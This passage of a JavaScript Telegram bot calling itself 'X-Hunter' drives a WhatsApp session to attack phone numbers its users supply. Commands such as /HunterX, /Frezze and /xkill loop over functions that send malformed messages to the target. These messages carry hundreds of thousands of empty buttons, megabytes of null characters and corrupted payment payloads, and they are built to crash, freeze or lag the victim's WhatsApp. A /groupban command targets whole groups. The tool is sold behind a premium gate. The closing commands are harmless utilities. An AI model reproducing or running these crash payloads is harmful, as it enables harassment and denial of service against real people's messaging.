        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 40; i++) {
    await DelayRexcc(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
⬡═―⊱「 X-HUNTER 」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Delay WhatsApp New
⌑ Status: Success
╘═——————————————═⬡\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("HunterX", checkWhatsAppConnection, checkPremium(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /HunterX 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `\`\`\`JS
⬡═―⊱「 X-HUNTER 」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Crash WhatsApp New
⌑ Status: Process
╘═——————————————═⬡\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await KenzyFC(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
⬡═―⊱「 X-HUNTER 」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Crash WhatsApp New
⌑ Status: Success
╘═——————————————═⬡\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Frezze", checkWhatsAppConnection, checkPremium(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Frezze 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `\`\`\`JS
⬡═―⊱「 X-HUNTER 」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Frezze WhatsApp New
⌑ Status: Process
╘═——————————————═⬡\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await FrezzChat(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
⬡═―⊱「 X-HUNTER 」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Frezze WhatsApp New
⌑ Status: Success
╘═——————————————═⬡\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

// ------ ( Case Bebas Spam ) ------ //
bot.command("xbugs", checkWhatsAppConnection, checkPremium(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xbugs 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `\`\`\`JS
⿻𝐗-𝐡𝐮𝐧𝐭𝐞𝐫⿻ 

» Information:
☇ Target: ${q}
☇ Type: invisible bebas spam
☇ Status : succees 
────────────────────
© 𝐗-𝐡𝐮𝐧𝐭𝐞𝐫\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐇𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await VnFDelayInvisble(sock, target);
    await sleep(1500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
⿻𝐗-𝐡𝐮𝐧𝐭𝐞𝐫⿻ 

» Information:
☇ Target: ${q}
☇ Type: invisible bebas spam
☇ Status : succees 
────────────────────
© 𝐗-𝐡𝐮𝐧𝐭𝐞𝐫\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐇𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xkill", checkWhatsAppConnection, checkPremium(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xkill 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `\`\`\`JS
⿻𝐗-𝐡𝐮𝐧𝐭𝐞𝐫⿻ 

» Information:
☇ Target: ${q}
☇ Type: delay invisible bebas spam
☇ Status : succees 
────────────────────
© 𝐗-𝐡𝐮𝐧𝐭𝐞𝐫\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐇𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await VnFDelayInvisble(sock, target);
    await sleep(1500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
⿻𝐗-𝐡𝐮𝐧𝐭𝐞𝐫⿻ 

» Information:
☇ Target: ${q}
☇ Type: delay invisible bebas spam v2
☇ Status : succees 
────────────────────
© 𝐗-𝐡𝐮𝐧𝐭𝐞𝐫\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐇𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xcokoz", checkWhatsAppConnection, checkPremium(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xcokoz 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `\`\`\`JS
⿻𝐗-𝐡𝐮𝐧𝐭𝐞𝐫⿻ 

» Information:
☇ Target: ${q}
☇ Type: delay invisible X Buldo bebas spam
☇ Status : succees 
────────────────────
© 𝐗-𝐡𝐮𝐧𝐭𝐞𝐫\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐇𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await VnFDelayInvisble(sock, target);
    await sleep(1500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
⿻𝐗-𝐡𝐮𝐧𝐭𝐞𝐫⿻ 

» Information:
☇ Target: ${q}
☇ Type: delay invisible X buldo bebas spam v2
☇ Status : succees 
────────────────────
© 𝐗-𝐡𝐮𝐧𝐭𝐞𝐫\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐇𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xynerx", checkWhatsAppConnection, checkPremium(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xynerx 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `\`\`\`JS
⿻𝐗-𝐡𝐮𝐧𝐭𝐞𝐫⿻ 

» Information:
☇ Target: ${q}
☇ Type: delay bebas spam 
☇ Status : succees 
────────────────────
© 𝐗-𝐡𝐮𝐧𝐭𝐞𝐫\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐇𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await VnFDelayInvisble(sock, target);
    await sleep(1500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
⿻𝐗-𝐡𝐮𝐧𝐭𝐞𝐫⿻ 

» Information:
☇ Target: ${q}
☇ Type: delay bebas spam
☇ Status : succees 
────────────────────
© 𝐗-𝐡𝐮𝐧𝐭𝐞𝐫\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐇𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });
});
bot.command(
  "groupban",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {

    const chatId = ctx.chat.id;

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const input = ctx.message.text.split(" ").slice(1).join(" ").trim();

    if (!input) {
      return ctx.reply(
        "🪧 Example:\n/groupban https://chat.whatsapp.com/xxxx\n/groupban 123456789@g.us"
      );
    }

    let groupJid;

    try {
      const inviteRegex = /https:\/\/chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
      const matchInvite = input.match(inviteRegex);

      if (matchInvite) {
        const code = matchInvite[1];

        const progress = await ctx.reply("⏳ Bergabung ke grup...");

        groupJid = await sock.groupAcceptInvite(code);

        await ctx.telegram.editMessageText(
          chatId,
          progress.message_id,
          undefined,
          `✅ Berhasil bergabung ke grup.\n\n${groupJid}`
        );

      } else {

        if (!input.endsWith("@g.us")) {
          return ctx.reply(
            "❌ Masukkan link undangan atau ID grup yang valid."
          );
        }

        groupJid = input;
      }

    } catch (err) {
      return ctx.reply(`❌ ${err.message}`);
    }

    const msg = await ctx.reply(
`🚀 Group Ban By X-hunter 

👤 User : ${username}
🎯 Target : ${groupJid}
⏳ Status : Processing...`
    );

    try {

      // ✅ FIX
      await groupBan(sock, groupJid);

      await ctx.telegram.editMessageText(
        chatId,
        msg.message_id,
        undefined,
`🚀 Group Ban By X-hunter 

👤 User : ${username}
🎯 Target : ${groupJid}
✅ Status : Success`,
        {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "☇ Check Grup",
                  url: "https://chat.whatsapp.com/"
                }
              ]
            ]
          }
        }
      );

    } catch (err) {

      await ctx.telegram.editMessageText(
        chatId,
        msg.message_id,
        undefined,
`🚀 Group Ban By X-hunter

👤 User : ${username}
🎯 Target : ${groupJid}
❌ Status : ${err.message}`
      );

    }

  }
);

// ------ ( Awal Of Function Bug) ------ //
async function FrezzChat(sock, target) {
    try {
        const payloads = [
            {
                groupStatusMessageV2: {
                    message: {
                        interactiveMessage: {
                            body: { text: "X-hunterIsHare" },
                            nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})) },
                            contextInfo: { quotedMessage: { stickerPackMessage: {} } }
                        }
                    }
                }
            },
            {
                groupStatusMessageV2: {
                    groupJid: "120363000000000000@g.us",
                    status: "@Meta_AI",
                    message: {
                        interactiveResponseMessage: {
                            body: { text: "invis" },
                            nativeFlowResponseMessage: {
                                name: "menu_options",
                                paramsJson: JSON.stringify({
                                    display_text: "\u0000".repeat(999999),
                                    description: "\u0000".repeat(99999),
                                    id: "CELAN"
                                }),
                                version: 3
                            }
                        }
                    }
                }
            },
            {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            header: { title: "\u0000.CELAN" + "{{".repeat(500000) },
                            body: { text: "X-hunter SHD", footer: "X-hunter" },
                            nativeFlowResponseMessage: {
                                name: "order_status",
                                paramsJson: "\x10".repeat(500000) + "\u0000".repeat(800000),
                                version: 3
                            },
                            entryPointConversionSource: "payment_info"
                        }
                    }
                }
            },
            {
                interactiveMessage: {
                    body: { text: "X-hunter" },
                    footer: { text: "X-hunter Is Hare " },
                    nativeFlowMessage: {
                        buttons: [{
                            name: "galaxy_message",
                            buttonParamsJson: JSON.stringify({
                                wa_flow_response_params: {
                                    title: "${Msg}",
                                    overflow: "${Bkp}"
                                },
                                crash: { null: null, recursive: {} }
                            })
                        }],
                        messageParamsJson: JSON.stringify({ version: 0 })
                    },
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true,
                        forwardingScore: 999
                    }
                }
            },
            {
                interactiveMessage: {
                    body: { text: "LOADING..." },
                    nativeFlowMessage: { buttons: Array.from({ length: 99999 }, () => ({})) }
                }
            }
        ];

        for (let i = 0; i < 100; i++) {
            for (const payload of payloads) {
                await sock.relayMessage(target, payload, {
                    participant: { jid: target },
                    noSelfSync: true
                });
            }
        }

        return "✅ Frezz Done : " + target;
    } catch (e) {
        return "❌ " + e.message;
    }
}

async function DelayRexcc(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "Rexcc lagi angee"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          },
          contextInfo: {
            quotedMessage: {
              stickerPackMessage: {}
            }
          }
        }
      }
    }
  }, {
    participant: {
      jid: target
    }
  });
}

async function VnFDelayInvisble(target, ptcp = true) {
    for (let r = 0; r < 1000; r++) {
        const payload = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "( !驴 ) 饾棭饾椈饾棛 饾棗饾棽饾椆饾棶饾槅 饾棓饾椈饾椃饾椂饾椈饾棿 ( 驴! )",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_request"
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
        },
        );

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: payload.message,
            },
        }, ptcp ?
            {
                messageId: payload.key.id,
                participant: { jid: target }
            } : { messageId: payload.key.id }
        );
        await sleep(1000);
    }

    const message = {
        viewOnceMessage: {
            message: {
                requestPaymentMessage: {
                    body: {
                        text: "( 隆驴 ) 饾棜饾槅饾槆饾棽饾椈饾棢饾槅饾椉饾椏饾棶饾棶 ( 驴! )",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "review_and_pay",
                        paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"null\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}",
                        version: 3
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, message, {
        groupId: null,
        participant: { jid: target }
    });

    await sock.relayMessage(
        target,
        {
            sendPaymentMessage: {},
            requestPaymentMessage: {},
            imageMessage: {
                url: null
            }
        },
        {
            participant: { jid: target }
        }
    );
}

// ------ ( Akhir Of Function Bug) ------ //
bot.command('setchannel', (ctx) => {
  if (!isOwner(ctx)) return ctx.reply('❌ Anda bukan owner')

  const arg = ctx.message.text.split(' ')[1]

  if (!arg) {
    return ctx.reply('Format: /setchannel @channel / off')
  }

  if (arg === 'off') {
    forceChannel = null
    return ctx.reply('❌ Channel dihapus')
  }

  forceChannel = arg
  ctx.reply(`✅ Channel diset ke ${arg}`)
})

// =================
// ON / OFF FITUR
// =================
bot.command('channel', (ctx) => {
  if (!isOwner(ctx)) return ctx.reply('❌ Anda bukan owner')

  const arg = ctx.message.text.split(' ')[1]

  if (arg === 'on') {
    if (!forceChannel) {
      return ctx.reply('❌ Set channel dulu pakai /setchannel')
    }

    channelOn = true
    ctx.reply('🔒 Force Join diaktifkan')
  } 
  else if (arg === 'off') {
    channelOn = false
    ctx.reply('🔓 Force Join dimatikan')
  } 
  else {
    ctx.reply('Gunakan: /channel on / off')
  }
})

bot.command('grouponly', (ctx) => {
  const userId = String(ctx.from.id)
  const isOwner = ID_TELEGRAM || isAdmin(userId);

  if (!isOwner) {
    return ctx.reply('❌ Anda bukan owner')
  }

  const arg = ctx.message.text.split(' ')[1]

  if (arg === 'on') {
    groupOnly = true
    ctx.reply('🔒 Group Only diaktifkan (SEMUA private diblok)')
  } else if (arg === 'off') {
    groupOnly = false
    ctx.reply('🔓 Group Only dimatikan')
  } else {
    ctx.reply('Gunakan: /grouponly on / off')
  }
})

bot.command('cekemoji', async (ctx) => {
  const reply = ctx.message.reply_to_message;

  if (!reply) {
    return ctx.reply(`
❌ Reply pesan yang berisi emoji premium.

Contoh:
- User kirim emoji premium
- Reply emoji tersebut dengan command /cekemoji
    `);
  }

  const emojis = [];

  if (reply.entities) {
    reply.entities.forEach((entity) => {
      if (entity.type === "custom_emoji") {
        emojis.push({
          id: entity.custom_emoji_id
        });
      }
    });
  }

  if (reply.caption_entities) {
    reply.caption_entities.forEach((entity) => {
      if (entity.type === "custom_emoji") {
        emojis.push({
          id: entity.custom_emoji_id
        });
      }
    });
  }

  if (emojis.length === 0) {
    return ctx.reply(`
❌ Tidak ada custom emoji terdeteksi.

Gunakan command ini dengan reply ke pesan yang berisi emoji premium Telegram.
    `);
  }

  let result = `
<b>╔════════════════════╗
   CUSTOM EMOJI FOUND
╚════════════════════╝</b>
`;

  emojis.forEach((e, i) => {
    result += `

<b>-> Emoji ${i + 1}</b>
<code>${e.id}</code>

<b>Format Pakai:</b>
<code>&lt;tg-emoji emoji-id="${e.id}"&gt;✨&lt;/tg-emoji&gt;</code>
`;
  });

  result += `

<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>Total Emoji:</b> ${emojis.length}
`;

  await ctx.reply(result, {
    parse_mode: "HTML"
  });
});

// ================= COMMAND CHECK ERROR ================= //
bot.command("CheckError", async (ctx) => {
  try {
    const msg = ctx.message.reply_to_message;

    if (!msg || !msg.document) {
      return ctx.reply("❌ Reply file JavaScript (.js)");
    }

    const doc = msg.document;

    if (!doc.file_name.endsWith(".js")) {
      return ctx.reply("❌ File harus format .js");
    }

    const fileLink = await ctx.telegram.getFileLink(doc.file_id);

    const tempPath = path.join(__dirname, `check_${Date.now()}.js`);

    // download file
    const res = await axios.get(fileLink.href, {
      responseType: "arraybuffer"
    });

    fs.writeFileSync(tempPath, res.data);

    const code = fs.readFileSync(tempPath, "utf8");

    let output;

    try {
      new Function(code);
      output = "✅ <b>Tidak ditemukan syntax error</b>";
    } catch (err) {
      output = `
❌ <b>Error ditemukan</b>

<pre>${err.message}</pre>
      `;
    }

    await ctx.reply(
      `<b>📦 HASIL CHECK ERROR</b>\n\n${output}`,
      { parse_mode: "HTML" }
    );

    fs.unlinkSync(tempPath);

  } catch (err) {
    console.log("CHECK ERROR:", err.message);
    ctx.reply("❌ Terjadi error saat proses.");
  }
});

// ================= COMMAND FIX ERROR ================= //
bot.command("fixerror", async (ctx) => {
  try {
    const msg = ctx.message.reply_to_message;

    if (!msg || !msg.document) {
      return ctx.reply("❌ Reply file .js");
    }

    const doc = msg.document;

    if (!doc.file_name.endsWith(".js")) {
      return ctx.reply("❌ File harus JavaScript (.js)");
    }

    const fileLink = await ctx.telegram.getFileLink(doc.file_id);
    const tempPath = path.join(__dirname, `fix_${Date.now()}.js`);

    const res = await axios.get(fileLink.href, {
      responseType: "arraybuffer"
    });

    fs.writeFileSync(tempPath, res.data);

    let code = fs.readFileSync(tempPath, "utf8");

    let errorBefore = null;

    try {
      new Function(code);
    } catch (err) {
      errorBefore = err.message;
    }

    // fix code
    const fixedCode = autoFixJS(code);

    let errorAfter = null;

    try {
      new Function(fixedCode);
    } catch (err) {
      errorAfter = err.message;
    }

    const fixedPath = path.join(__dirname, `fixed_${Date.now()}.js`);
    fs.writeFileSync(fixedPath, fixedCode);

    // ================= RESULT ================= //
    let result = `<b>📦 FIX ERROR RESULT</b>\n\n`;

    if (!errorBefore) {
      result += "✅ Tidak ada error dari awal.";
    } else {
      result += `❌ Error sebelum:\n<pre>${errorBefore}</pre>\n\n`;

      if (!errorAfter) {
        result += "✅ Berhasil diperbaiki!";
      } else {
        result += `⚠️ Masih ada error:\n<pre>${errorAfter}</pre>`;
      }
    }

    await ctx.reply(result, { parse_mode: "HTML" });

    // kirim file hasil fix
    await ctx.replyWithDocument({
      source: fixedPath,
      filename: "fixed.js"
    });

    fs.unlinkSync(tempPath);

  } catch (err) {
    console.log("FIX ERROR:", err.message);
    ctx.reply("❌ Gagal proses.");
  }
});

// ---- ( akhir of menu ) ---- //
bot.launch();